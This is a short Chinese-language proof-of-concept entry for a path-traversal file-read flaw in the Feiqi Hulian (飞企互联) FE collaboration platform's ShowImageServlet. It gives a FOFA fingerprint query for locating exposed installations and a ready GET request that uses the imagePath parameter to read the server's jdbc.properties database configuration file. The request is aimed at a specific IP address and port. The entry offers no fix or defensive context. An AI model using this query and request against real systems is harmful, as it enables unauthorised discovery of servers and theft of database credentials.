# 飞企互联 FE 业务协作平台 ShowImageServlet 文件 magePath 参数文件读取漏洞

    ## fofa

```
body="js39/flyrise.stopBackspace.js" || body="src=\"/js39/flyrise.dialog.js" || body="src=\"/js39/external/jquery"
```

## poc

```
GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1
Host: 110.53.162.145:9090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip

```
